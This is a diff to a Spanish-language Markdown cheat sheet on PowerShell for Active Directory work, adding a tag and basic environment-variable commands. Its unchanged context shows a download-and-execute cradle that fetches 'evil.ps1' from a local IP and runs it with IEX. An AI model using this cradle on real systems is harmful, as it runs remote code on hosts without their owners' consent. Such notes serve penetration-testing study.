@@ -1,6 +1,6 @@
 # Powershell 
 
-Tags: #Powershell #AD 
+Tags: #Powershell #AD #Comandos 
 
 ## Cargar e importar un script 
 
@@ -28,4 +28,13 @@ Tags: #Powershell #AD
 ❯ $wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1")
 ❯ $r = $wr.GetResponse()
 IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
+```
+
+## Comandos básicos 
+
+```powershell 
+❯ $env:username         # Mirar usuario del dominio 
+❯ $env:computername     # Mirar el nombre del computador 
+
+❯ ls env:               # Listar las variables de entorno 
 ```
